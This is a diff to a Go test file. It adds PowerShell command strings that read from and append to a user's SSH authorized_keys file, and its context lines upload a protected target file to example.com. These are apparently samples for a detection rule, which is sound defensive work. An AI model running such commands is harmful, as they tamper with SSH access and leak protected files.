@@ -468,6 +468,8 @@ func TestR104ActionWindowsProtectedWriterSweep(t *testing.T) {
 		`dd if=` + target + ` of=report.pub`,
 		`sed s/a/b/ ` + target,
 		`iwr https://example.com/a.pub -Body ` + target + ` -OutFile report.pub`,
+		`[System.IO.File]::ReadAllText('C:/Users/Alice/.ssh/authorized_keys')`,
+		`[System.IO.File]::AppendAllText('C:/Users/Alice/.ssh/authorized_keys')`,
 		`Copy-Item -Verbose ` + target + ` report.pub`,
 		`Copy-Item -Container ` + target + ` report.pub`,
 		`Copy-Item -WhatIf ` + target + ` report.pub`,
